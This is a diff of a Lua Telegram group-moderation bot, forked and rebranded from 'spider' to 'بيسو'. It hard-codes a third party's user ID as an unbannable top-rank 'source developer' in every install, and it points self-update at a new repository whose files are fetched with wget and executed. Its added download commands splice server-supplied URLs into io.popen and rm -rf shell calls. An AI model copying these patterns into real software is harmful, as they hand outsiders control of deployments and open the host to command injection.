@@ -8,7 +8,7 @@ https   = require("ssl.https")
 sudos   = dofile("sudo.lua")
 bot_id  = token:match("(%d+)")  
 Id_Sudo = Sudo
-List_Sudos = {Id_Sudo,833156404}
+List_Sudos = {Id_Sudo,620800281}
 User = io.popen("whoami"):read('*a')
 IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a')
 name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a')
@@ -155,7 +155,7 @@ end
 return var
 end 
 function Rank_Checking(user_id,chat_id)
-if tonumber(user_id) == tonumber(833156404) then  
+if tonumber(user_id) == tonumber(620800281) then  
 var = true  
 elseif tonumber(user_id) == tonumber(Id_Sudo) then
 var = true  
@@ -183,7 +183,7 @@ end
 return var
 end 
 function Get_Rank(user_id,chat_id)
-if tonumber(user_id) == tonumber(833156404) then  
+if tonumber(user_id) == tonumber(620800281) then  
 var = 'مطور السورس'
 elseif Devspidere(user_id) == true then
 var = "المطور الاساسي"  
@@ -425,7 +425,7 @@ ID="InputMessageAudio",
 audio_ = GetInputFile(audio),
 duration_ = "",
 title_ = title or "",
-performer_ = "سورس سبايدر الرسمي",
+performer_ = "سورس بيسوالرسمي",
 caption_ = caption or ""
 }},func or dl_cb,nil)
 end
@@ -1533,6 +1533,52 @@ database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
 send(msg.chat_id_, msg.id_,"⋄︙تم حفظ الامر")  
 database:del(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
 return false
+end
+if text == 'تعطيل اليوتيوب' and Constructor(msg) then   
+send(msg.chat_id_,msg.id_,'⌔︙تم تعطيل اليوتيوب')   
+database:set(bot_id.."dl_yt_dl"..msg.chat_id_,"close")  
+return false   
+end  
+if text == 'تفعيل اليوتيوب' and Constructor(msg) then   
+send(msg.chat_id_,msg.id_,'⌔︙تم تفعيل اليوتيوب')   
+database:set(bot_id.."dl_yt_dl"..msg.chat_id_,"open")  
+return false   
+end 
+if text and text:match('^بصمه (.*)$')  and database:get(bot_id.."dl_yt_dl"..msg.chat_id_) == "open" then  
+send(msg.chat_id_, msg.id_,'⌔︙  جاري التحميل voice')  
+end 
+if text and text:match('^بصمه (.*)$')  and database:get(bot_id.."dl_yt_dl"..msg.chat_id_) == "open" then             
+local Ttext = text:match('^بصمه (.*)$')  
+local InfoSearch = https.request('https://mode-dev.tk/tg/search.php?search='..URL.escape(Ttext)) 
+local JsonSearch = JSON.decode(InfoSearch) 
+for k,vv in pairs(JsonSearch.results) do 
+if k == 1 then 
+local GetStart = io.popen('downloadsh '..vv.url):read('*all') 
+if GetStart and GetStart:match('(.*)oksend(.*)') then 
+print('download Mp3 done ...\nName : '..vv.title..'\nIdLink : '..vv.url) 
+sendVoice(msg.chat_id_, msg.id_,'./'..vv.url..'.mp3',vv.title,'- '..vv.title..'\n- @MUSIC_REMAS_3','@O9oOoO') 
+os.execute('rm -rf ./'..vv.url..'.mp3')  
+end 
+end 
+end 
+end 
+if text and text:match('^صوت (.*)$')  and database:get(bot_id.."dl_yt_dl"..msg.chat_id_) == "open" then  
+send(msg.chat_id_, msg.id_,'⌔︙  جاري التحميل audio ')  
+end 
+if text and text:match('^صوت (.*)$')  and database:get(bot_id.."dl_yt_dl"..msg.chat_id_) == "open" then             
+local Ttext = text:match('^صوت (.*)$')  
+local InfoSearch = https.request('https://mode-dev.tk/tg/search.php?search='..URL.escape(Ttext)) 
+local JsonSearch = JSON.decode(InfoSearch) 
+for k,vv in pairs(JsonSearch.results) do 
+if k == 1 then 
+local GetStart = io.popen('downloadsh '..vv.url):read('*all') 
+if GetStart and GetStart:match('(.*)oksend(.*)') then 
+print('download Mp3 done ...\nName : '..vv.title..'\nIdLink : '..vv.url) 
+sendAudio(msg.chat_id_,msg.id_,'./'..vv.url..'.mp3',vv.title,'- '..vv.title..'\n- @MUSIC_REMAS_3','@O9oOoO') 
+os.execute('rm -rf ./'..vv.url..'.mp3')  
+end 
+end 
+end 
 end
 --------------------------------------------------------------------------------------------------------------
 if Chat_Type == 'GroupBot' then
@@ -3427,7 +3473,7 @@ if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
 send(msg.chat_id_,msg.id_,"⋄︙عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
 return false 
 end      
-if result.id_ == tonumber(833156404) then
+if result.id_ == tonumber(620800281) then
 send(msg.chat_id_, msg.id_, "⋄︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -3450,7 +3496,7 @@ if userid == tonumber(Id_Sudo) then
 send(msg.chat_id_, msg.id_, "⋄︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور البوت الاساسي \n")
 return false 
 end
-if userid == tonumber(833156404) then
+if userid == tonumber(620800281) then
 send(msg.chat_id_, msg.id_, "⋄︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -4502,7 +4548,7 @@ send(msg.chat_id_, msg.id_,'⋄︙لقد تم تعطيل الحظر و الطر�
 return false
 end
 function Function_spider(extra, result, success)
-if result.sender_user_id_ == tonumber(833156404) then
+if result.sender_user_id_ == tonumber(620800281) then
 send(msg.chat_id_, msg.id_, "⋄︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -4539,7 +4585,7 @@ if result.id_ == tonumber(Id_Sudo) then
 send(msg.chat_id_, msg.id_, "⋄︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور البوت \n")
 return false 
 end
-if result.id_ == tonumber(833156404) then
+if result.id_ == tonumber(620800281) then
 send(msg.chat_id_, msg.id_, "⋄︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -4582,7 +4628,7 @@ if userid == tonumber(Id_Sudo) then
 send(msg.chat_id_, msg.id_, "⋄︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور البوت \n")
 return false 
 end
-if userid == tonumber(833156404) then
+if userid == tonumber(620800281) then
 send(msg.chat_id_, msg.id_, "⋄︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -4652,7 +4698,7 @@ end
 
 if text == ("كتم") and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then   
 function Function_spider(extra, result, success)
-if result.sender_user_id_ == tonumber(833156404) then
+if result.sender_user_id_ == tonumber(620800281) then
 send(msg.chat_id_, msg.id_, "⋄︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس  \n")
 return false 
 end
@@ -4682,7 +4728,7 @@ return false
 end
 function Function_spider(extra, result, success)
 if result.id_ then
-if result.id_ == tonumber(833156404) then
+if result.id_ == tonumber(620800281) then
 send(msg.chat_id_, msg.id_, "⋄︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -4705,7 +4751,7 @@ return false
 end
 if text and text:match("^كتم (%d+)$") and Addictive(msg) then   
 local userid = text:match("^كتم (%d+)$")
-if userid == tonumber(833156404) then
+if userid == tonumber(620800281) then
 send(msg.chat_id_, msg.id_, "⋄︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -6998,8 +7044,8 @@ database:srem(bot_id.."Chek:Groups",GP_ID[2])
 return false 
 end
 end
-if text == (database:get(bot_id.."Name:Bot") or "سبايدر") then      
-Namebot = (database:get(bot_id.."Name:Bot") or "سبايدر")
+if text == (database:get(bot_id.."Name:Bot") or "بيسو") then      
+Namebot = (database:get(bot_id.."Name:Bot") or "بيسو")
 local namebot = {
 'ۿۧهلا ؏ـمࢪي .',
 'اكلك تحبني ؟ وتصيحني هلكد',
@@ -7014,7 +7060,7 @@ send(msg.chat_id_, msg.id_, namebot[name])
 return false 
 end
 if text == "بوت" then
-Namebot = (database:get(bot_id.."Name:Bot") or "سبايدر")
+Namebot = (database:get(bot_id.."Name:Bot") or "بيسو")
 send(msg.chat_id_, msg.id_,"اسمي ["..Namebot.."] ") 
 end
 if text == "تغير اسم البوت" or text == "تغيير اسم البوت" or text == "حذف اسم البوت" then 
@@ -8445,8 +8491,8 @@ if text == ("تحديث السورس") and Devspider(msg) then
 send(msg.chat_id_,msg.id_,'⋄︙تم التحديث')
 os.execute('rm -rf spider.lua')
 os.execute('rm -rf start.lua')
-os.execute('wget https://raw.githubusercontent.com/spider/spidersr/master/spider.lua')
-os.execute('wget https://raw.githubusercontent.com/spider/spidersr/master/start.lua')
+os.execute('wget https://raw.githubusercontent.com/llbesox/spider/master/spider.lua')
+os.execute('wget https://raw.githubusercontent.com/llbesox/spider/master/start.lua')
 dofile('spider.lua')  
 return false
 end
@@ -8849,94 +8895,6 @@ send(msg.chat_id_, msg.id_,"["..data.first_name_.."](T.me/"..data.username_..")"
 end,nil)   
 end
 end
-if text == 'الملفات' and Devspider(msg) then
-t = '⋄︙جميع الملفات : \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
-i = 0
-for v in io.popen('ls spider_Files'):lines() do
-if v:match(".lua$") then
-i = i + 1
-t = t..i..'*~ '..v..'*\n'
-end
-end
-send(msg.chat_id_, msg.id_,t)
-end
-if text == "متجر الملفات" or text == 'المتجر' then
-if Devspider(msg) then
-local Get_Files, res = https.request("https://raw.githubusercontent.com/spidersr/files_spider/main/getfile.json")
-if res == 200 then
-local Get_info, res = pcall(JSON.decode,Get_Files);
-vardump(res.plugins_)
-if Get_info then
-local TextS = "\n⋄︙اهلا بك في متجر ملفات سبايدر\n⋄︙يوجد في المتجر ملف الردود\n⋄︙يتم ادراج الملفات في التحديثات القادمه \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
-local TextE = "\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⋄︙تدل علامة (✔) الملف مفعل\n".."⋄︙تدل علامة (✖) الملف معطل\n"
-local NumFile = 0
-for name,Info in pairs(res.plugins_) do
-local Check_File_is_Found = io.open("spider_Files/"..name,"r")
-if Check_File_is_Found then
-io.close(Check_File_is_Found)
-CeckFile = "(✔)"
-else
-CeckFile = "(✖)"
-end
-NumFile = NumFile + 1
-TextS = TextS..'*'..NumFile..">* {`"..name..'`} > '..CeckFile..'\n[-  About to the file]('..Info..')\n'
-end
-send(msg.chat_id_, msg.id_,TextS..TextE) 
-end
-else
-send(msg.chat_id_, msg.id_,"⋄︙لا يوجد اتصال من ال api \n") 
-end
-return false
-end
-end
-
-if text and text:match("^(تعطيل ملف) (.*)(.lua)$") and Devspider(msg) then
-local name_t = {string.match(text, "^(تعطيل ملف) (.*)(.lua)$")}
-local file = name_t[2]..'.lua'
-local file_bot = io.open("spider_Files/"..file,"r")
-if file_bot then
-io.close(file_bot)
-t = "*⋄︙الملف > {"..file.."}\n⋄︙تم تعطيله وحذفه بنجاح \n✓*"
-else
-t = "*⋄︙بالتاكيد تم تعطيل وحذف ملف > {"..file.."} \n✓*"
-end
-local json_file, res = https.request("https://raw.githubusercontent.com/spidersr/files_spider/main/files_spider/"..file)
-if res == 200 then
-os.execute("rm -fr spider_Files/"..file)
-send(msg.chat_id_, msg.id_,t) 
-dofile('spider.lua')  
-else
-send(msg.chat_id_, msg.id_,"*⋄︙عذرا لا يوجد هاكذا ملف في المتجر *\n") 
-end
-return false
-end
-if text and text:match("^(تفعيل ملف) (.*)(.lua)$") and Devspider(msg) then
-local name_t = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}
-local file = name_t[2]..'.lua'
-local file_bot = io.open("spider_Files/"..file,"r")
-if file_bot then
-io.close(file_bot)
-t = "*⋄︙بالتاكيد تم تنزيل وتفعيل ملف > {"..file.."} \n✓*"
-else
-t = "*⋄︙الملف > {"..file.."}\n⋄︙تم تنزيله وتفعيله بنجاح \n*"
-end
-local json_file, res = https.request("https://raw.githubusercontent.com/spidersr/files_spider/main/files_spider/"..file)
-if res == 200 then
-local chek = io.open("spider_Files/"..file,'w+')
-chek:write(json_file)
-chek:close()
-send(msg.chat_id_, msg.id_,t) 
-dofile('spider.lua')  
-else
-send(msg.chat_id_, msg.id_,"*⋄︙عذرا لا يوجد هاكذا ملف في المتجر *\n") 
-end
-return false
-end
-if text == "مسح جميع الملفات" and Devspider(msg) then
-os.execute("rm -fr spider_Files/*")
-send(msg.chat_id_,msg.id_,"⋄︙تم حذف جميع الملفات")
-return false
-end
 if text == 'نقل الاحصائيات' and Devspider(msg) then
 local Users = database:smembers(''..bot_id.."userss")
 local Groups = database:smembers(''..bot_id..'groups') 
@@ -9030,44 +8988,48 @@ send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
 return false
 end
 if text == "مصه" or text == "بوسه" then
-local texting = {"ما ما ما اخجل شني 😭??💞","ماا وخر مابوسك 😭💞💞"," ما ما ما اخجل شني 😭😭💞"}
+local texting = {"ما ما ما اخجل شني 😭??💞","ماا وخر مابوسك 😭💞💞"," ما ما ما اخجل شني 😭????"}
 send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
 return false
 end
 
-if text == 'رابط الحذف' or text == 'رابط حذف' then
-t =[[
-رابط الحذف في جميع مواقع التواصل ●
-فكر قبل لا تتسرع وتروح
-ٴ●○━━━∴━━━●○ٴ
- ● رابط حذف  [Telegram](https://my.telegram.org/auth?to=delete) ܁
- ● رابط حذف [instagram](https://www.instagram.com/accounts/login/?next=/accounts/remove/request/permanent/) ܁
- ● رابط حذف [Facebook](https://www.facebook.com/help/deleteaccount) ܁
- ● رابط حذف [Snspchat](https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fdeleteaccount) ܁
+if text == 'رابط الحذف' or text == 'رابط حذف' or text == 'رابط حذف انستا' then
+Text =[[
+رابط الحذف في جميع مواقع التواصل فكر قبل لا تتسرع وتروح
 ]]
-send(msg.chat_id_, msg.id_,t) 
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = ' ● رابط حذف تلي كرام ●.',url="https://my.telegram.org/auth?to=delete"}},
+{{text = ' ● رابط حذف الانستا ●.',url="https://www.instagram.com/accounts/login/?next=/accounts/remove/request/permanent/"}},
+{{text = '● رابط حذف فيسبوك ● .',url="https://www.facebook.com/help/deleteaccount"}},
+{{text = ' ● رابط حذف سناب شات ● .',url="https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fdeleteaccount"}},
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 return false
 end
 if text == 'الاوامر' then     
 if not Addictive(msg) then
-send(msg.chat_id_, msg.id_,'⋄︙عذرا الاوامر هذا لا تخصك ') 
+send(msg.chat_id_, msg.id_,'• عذرا الاوامر هذا لا تخصك ') 
 return false
 end
 local Text =[[
-┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-① > لعرض اوامر الحمايه
-② > لعرض اوامر الادمنيه
-③ > لعرض اوامر المدراء
-④ > لعرض اوامر المنشئين
-⑤ > لعرض اوامر المطورين
-┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-𝘊𝘩 - [𝘚𝘱𝘪𝘥𝘦𝘳 𝘴𝘰𝘳𝘶𝘤𝘦](t.me/Vc33h)
+ـ spider Source ـ 
+ —ـ—ـ—ـ—ـ—ـ—ـ—ـ—ـ— 
+⌔︙لعرض اوامر الحمايه ⌯ 𝟏 ⌯ .
+⌔︙لعرض الاوامر الخدميه ⌯ 𝟐 ⌯ .
+⌔︙لعرض اوامر المدراء ⌯ 𝟑 ⌯ . 
+⌔︙لعرض اوامر المنشئين ⌯ 𝟒 ⌯  .
+⌔︙لعرض اوامر المطورين  ⌯ 𝟓 ⌯ .
+⌯ اضغط ( اوامر التسليه ) لرؤيتها 
+ —ـ—ـ—ـ—ـ—ـ—ـ—ـ—ـ—
+•[- 𝗠𝘂𝘀𝗶𝗰 مـيـوزڪٓـك ♪](t.me/MUSIC_REMAS_3)• •
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '①', callback_data="/help1"},{text = '②', callback_data="/help2"},{text = '③', callback_data="/help3"}},
-{{text = '④', callback_data="/help4"},{text = '⑤', callback_data="/help5"}},
-{{text = 'اوامر التسليه', callback_data="/help10"}},
+{{text = '⌯ 𝟏 ⌯', callback_data="/help1"},{text = '⌯ 𝟐 ⌯', callback_data="/help2"},{text = '⌯ 𝟑 ⌯', callback_data="/help3"}},
+{{text = '⌯ 𝟒 ⌯', callback_data="/help4"},{text = '⌯ 𝟓 ⌯', callback_data="/help6"}},
+{{text = 'اوامر التسليه', callback_data="/help5"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -9274,7 +9236,7 @@ end
 if Chat_Type == 'UserBot' then
 if text == '/start' then  
 if Devspider(msg) then
-local Text =  '-  𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝒔𝒑𝒊𝒅𝒆𝒓 المطور الاساسي \n- سورس سبايدر\n- يمكنك التحكم في الكيبورد من الاسفل\n- [تابع جديدنا](t.me/Vc33h) '
+local Text =  '-  𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝒔𝒑𝒊𝒅𝒆𝒓 المطور الاساسي \n- سورس بيسو\n- يمكنك التحكم في الكيبورد من الاسفل\n- [تابع جديدنا](t.me/Vc33h) '
 local keyboard = {
 {'الاحصائيات ⋄','تغيير المطور الاساسي ⋄'},
 {'تفعيل التواصل ⋄','تعطيل التواصل ⋄'},
@@ -9901,8 +9863,8 @@ if text == "تحديث السورس ⋄" then
 send(msg.chat_id_,msg.id_,'⋄︙تم التحديث')
 os.execute('rm -rf spider.lua')
 os.execute('rm -rf start.lua')
-os.execute('wget https://raw.githubusercontent.com/spider/spidersr/master/spider.lua')
-os.execute('wget https://raw.githubusercontent.com/spider/spidersr/master/start.lua')
+os.execute('wget https://raw.githubusercontent.com/llbesox/spider/master/spider.lua')
+os.execute('wget https://raw.githubusercontent.com/llbesox/spider/master/start.lua')
 dofile('spider.lua')  
 return false
 end
@@ -9914,6 +9876,7 @@ end
 end --- Chat_Type = 'UserBot' 
 end
 end
+
 function tdcli_update_callback(data)
 if data.ID == "UpdateChannel" then 
 if data.channel_.status_.ID == "ChatMemberStatusKicked" then 
@@ -9964,7 +9927,7 @@ local Teext =[[
 ⋄︙الكلايش
 ⋄︙السيلفي
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-𝘊𝘩 - [𝘚𝘱𝘪𝘥𝘦𝘳 𝘴𝘰𝘳𝘶𝘤𝘦](t.me/Vc33h)
+•[- 𝗠𝘂𝘀𝗶𝗰 مـيـوزڪٓـك ♪](t.me/MUSIC_REMAS_3)•
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -10037,7 +10000,7 @@ local Teext =[[
 ⋄︙مسح الصلاحيات
 ⋄︙مسح الرابط
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-𝘊𝘩 - [𝘚𝘱𝘪𝘥𝘦𝘳 𝘴𝘰𝘳𝘶𝘤𝘦](t.me/Vc33h)
+•[- 𝗠𝘂𝘀𝗶𝗰 مـيـوزڪٓـك ♪](t.me/MUSIC_REMAS_3)•
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -10085,7 +10048,7 @@ local Teext =[[
 ⋄︙تفعيل/تعطيل اوامر التحشيش
 ⋄︙تفعيل/تعطيل الرابط/جلب الرابط
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-𝘊𝘩 - [𝘚𝘱𝘪𝘥𝘦𝘳 𝘴𝘰𝘳𝘶𝘤𝘦](t.me/Vc33h)
+•[- 𝗠𝘂𝘀𝗶𝗰 مـيـوزڪٓـك ♪](t.me/MUSIC_REMAS_3)•
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -10122,7 +10085,7 @@ local Teext =[[
 ⋄︙اضف رسائل + العدد بالرد
 ⋄︙اضف مجوهرات+ العدد بالرد
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-𝘊𝘩 - [𝘚𝘱𝘪𝘥𝘦𝘳 𝘴𝘰𝘳𝘶𝘤𝘦](t.me/Vc33h)
+•[- 𝗠𝘂𝘀𝗶𝗰 مـيـوزڪٓـك ♪](t.me/MUSIC_REMAS_3)•
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -10182,7 +10145,7 @@ local Teext =[[
 ⋄︙رفع/تنزيل منشئ اساسي
 ⋄︙مسح المنشئين الاساسين
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-𝘊𝘩 - [𝘚𝘱𝘪𝘥𝘦𝘳 𝘴𝘰𝘳𝘶𝘤𝘦](t.me/Vc33h)
+•[- 𝗠𝘂𝘀𝗶𝗰 مـيـوزڪٓـك ♪](t.me/MUSIC_REMAS_3)•
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -10226,7 +10189,7 @@ local Teext =[[
 *⋄︙رزله*
 *⋄︙هينه*
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-𝘊𝘩 - [𝘚𝘱𝘪𝘥𝘦𝘳 𝘴𝘰𝘳𝘶𝘤𝘦](t.me/Vc33h)
+•[- 𝗠𝘂𝘀𝗶𝗰 مـيـوزڪٓـك ♪](t.me/MUSIC_REMAS_3)•
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -10238,25 +10201,27 @@ return https.request("https://api.telegram.org/bot"..token..'/editMessageText?ch
 end
 if DAata == '/help' then
 if not Addictive(data) then
-local notText = '⋄︙عذرا الاوامر هذه لا تخصك'
+local notText = '• عذرا الاوامر هذه لا تخصك'
 https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
 return false
 end
 local Teext =[[
-┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-① > لعرض اوامر الحمايه
-② > لعرض اوامر الادمنيه
-③ > لعرض اوامر المدراء
-④ > لعرض اوامر المنشئين
-⑤ > لعرض اوامر المطورين
-┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-𝘊𝘩 - [𝘚𝘱𝘪𝘥𝘦𝘳 𝘴𝘰𝘳𝘶𝘤𝘦](t.me/Vc33h)
+ـ spider Source ـ 
+ —ـ—ـ—ـ—ـ—ـ—ـ—ـ—ـ— 
+⌔︙لعرض اوامر الحمايه ⌯ 𝟏 ⌯ .
+⌔︙لعرض الاوامر الخدميه ⌯ 𝟐 ⌯ .
+⌔︙لعرض اوامر المدراء ⌯ 𝟑 ⌯ . 
+⌔︙لعرض اوامر المنشئين ⌯ 𝟒 ⌯  .
+⌔︙لعرض اوامر المطورين  ⌯ 𝟓 ⌯ .
+⌯ اضغط ( اوامر التسليه ) لرؤيتها 
+ —ـ—ـ—ـ—ـ—ـ—ـ—ـ—ـ—
+•[- 𝗠𝘂𝘀𝗶𝗰 مـيـوزڪٓـك ♪](t.me/MUSIC_REMAS_3)•
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '①', callback_data="/help1"},{text = '②', callback_data="/help2"},{text = '③', callback_data="/help3"}},
-{{text = '④', callback_data="/help4"},{text = '⑤', callback_data="/help5"}},
-{{text = 'اوامر التسليه', callback_data="/help10"}},
+{{text = '⌯ 𝟏 ⌯', callback_data="/help1"},{text = '⌯ 𝟐 ⌯', callback_data="/help2"},{text = '⌯ 𝟑 ⌯', callback_data="/help3"}},
+{{text = '⌯ 𝟒 ⌯', callback_data="/help4"},{text = '⌯ 𝟓 ⌯', callback_data="/help6"}},
+{{text = 'اوامر التسليه', callback_data="/help5"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -10451,7 +10416,7 @@ if NewCmmd then
 data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
 end
 end
-local Name_Bot = (database:get(bot_id.."Name:Bot") or "سبايدر")
+local Name_Bot = (database:get(bot_id.."Name:Bot") or "بيسو")
 if not database:get(bot_id.."Fun_Bots"..msg.chat_id_) then
 if text ==  ""..Name_Bot..' شنو رئيك بهاذا' and tonumber(msg.reply_to_message_id_) > 0 then     
 function FunBot(extra, result, success) 
